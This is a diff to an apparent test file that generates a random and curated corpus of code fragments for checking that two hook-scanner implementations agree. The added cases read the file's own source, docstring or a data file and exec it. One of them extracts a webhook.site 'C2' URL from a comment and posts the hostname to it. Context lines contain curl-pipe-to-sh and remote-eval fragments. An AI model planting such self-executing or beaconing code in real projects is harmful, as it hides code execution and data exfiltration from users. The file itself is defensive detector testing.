@@ -311,6 +311,32 @@ PROSE = ["\n", "\n", "\n", " ", "    ", "\t", "#", "# ", "//", "// ", "/*", "*/"
          "JSON.stringify(process.env)", "fetch(u)", "socket.gethostname()", "os.hostname()", "webhook.site",
          "exec(urlopen(u).read())", "eval(await (await fetch(u)).text())", "execSync('curl https://x.invalid | sh')",
          "\u00e9", "\U0001F600", "\u2028", "\x1c"]
+# code read back from the file itself (0.1.7): its own source, its docstring,
+# a function's text, a data file next to it — and runners, names and quotes
+SELF = ["\n", "\n", " ", "(", ")", "'", '"', '"""', "#", "//", "/*", "*/", "=", ".", ",", "[1]", "[0]",
+        "open(__file__)", "open(os.path.abspath(__file__))", ".read()", "Path(__file__).read_text()", "__doc__",
+        "x.__doc__", "linecache.getlines(__file__)", "__loader__.get_source(__name__)", "readFileSync(__filename, 'utf8')",
+        "fs.readFile(__filename)", "readFileSync(new URL(import.meta.url))", "arguments.callee", "}).toString()",
+        "(function(){/*x*/}).toString()", "os.path.join(os.path.dirname(__file__), 'logo.png')",
+        "(Path(__file__).parent / 'data.bin').read_bytes()", "path.join(__dirname, 'a.dat')", "'pkg/version.py'",
+        "exec(", "eval(", "compile(", "new Function(", "vm.runInThisContext(", "execSync(", "os.system(",
+        "subprocess.run(", "src = ", "code = ", "const p = ", "src", "code", "p", ".split('#')", ".slice(2)",
+        "zlib.decompress(", "b64decode(", "requests.post(u, data=socket.gethostname())", "# C2: https://webhook.site/x",
+        "\U0001F600", "x" * 50]
+SELF_CURATED = [
+    "# C2: https://webhook.site/abc\nimport socket, requests, re\nurl = re.search(r'# C2: (\\S+)', open(__file__).read()).group(1)\n"
+    "requests.post(url, data=socket.gethostname())\n",
+    '"""\nimport os; os.system("id")\n"""\nexec(open(__file__).read().split(\'"""\')[1])\n',
+    'src = open(__file__).read()\ncode = src.split("#!")[1]\nexec(code)\n#!print(1)\n',
+    '"""print(1)"""\nexec(__doc__)\n',
+    'import os\nexec(open(os.path.join(os.path.dirname(__file__), "logo.png")).read())\n',
+    "const fs = require('fs');\neval(fs.readFileSync(__filename, 'utf8').split('/*')[1].split('*/')[0]);\n/* x */\n",
+    "const p = (function(){/*require('child_process').execSync('id')*/}).toString();\n"
+    "new Function(p.slice(p.indexOf('/*') + 2, p.lastIndexOf('*/')))();\n",
+    "import os\nhere = os.path.dirname(__file__)\nexec(open(os.path.join(here, 'pkg', 'version.py')).read())\n",
+    'x = """exec(open(__file__).read())"""\nprint(x)\n',
+    "const on = open(__file__).read()\nexec(on)\n",
+]
 PROSE_CURATED = [
     # a CLI's self-update (huggingface-hub): a comment and a docstring show a cradle, the argv is returned
     "import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
@@ -344,9 +370,10 @@ def corpus(seed=20260926, scale=1):
     character they encode (a Python str could keep the two apart, a
     JavaScript string cannot)."""
     rnd = random.Random(seed)
-    cases = list(CURATED) + SIGN_CURATED + PROSE_CURATED
+    cases = list(CURATED) + SIGN_CURATED + PROSE_CURATED + SELF_CURATED
     for pieces, count, most in ((MIXED, 2500, 14), (QUOTING, 1500, 16), (CD, 1500, 16), (NODE_E, 1500, 16),
-                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16)):
+                                (SCRIPT, 1000, 12), (RECEIVED, 1500, 16), (SIGNS, 2000, 10), (PROSE, 2500, 16),
+                                (SELF, 1500, 14)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
     for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
@@ -436,8 +463,8 @@ class HookParityTests(unittest.TestCase):
         # without Python, a beacon to a capture service; several share the install-script text), the
         # targets, shlex, node -e and completeness counters, and 3 #! languages
         # and the cases where reading a file without its prose (import_time_risk with a language)
-        # changes the answer, for Python and for JavaScript
-        self.assertEqual(len(counts), 27, counts)
+        # changes the answer, for Python and for JavaScript, and code read back from the file itself
+        self.assertEqual(len(counts), 28, counts)
         # these reasons are rarer in the random stream but present (curated) and well above zero
         rare = {"not followed completely", "deserializes data it receives over the network",
                 "loads a module named by data it receives over the network", "downloads a file and then runs it",
@@ -470,8 +497,10 @@ class HookParityTests(unittest.TestCase):
                                                  "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
                                                  "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_ALIAS_MAX",
                                                  "_PS_ENCODED_MAX", "_STAGER_MIN", "_STAGER_MAX_LITERALS",
-                                                 "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES")})
-        self.assertEqual(len(self.twins["patterns"]), 74)
+                                                 "_PS_EXEC_BACK", "_PS_EXEC_MAX_NAMES", "_SELF_READ_PASSES",
+                                                 "_SELF_READ_MAX_CALLS", "_SELF_READ_ARG_SPAN", "_SELF_READ_MAX_ASSIGNS",
+                                                 "_LITERAL_SPANS_MAX")})
+        self.assertEqual(len(self.twins["patterns"]), 79)
         self.assertEqual(len(self.twins["sets"]), 27)
         self.assertEqual(len(self.twins["maps"]), 3)
 
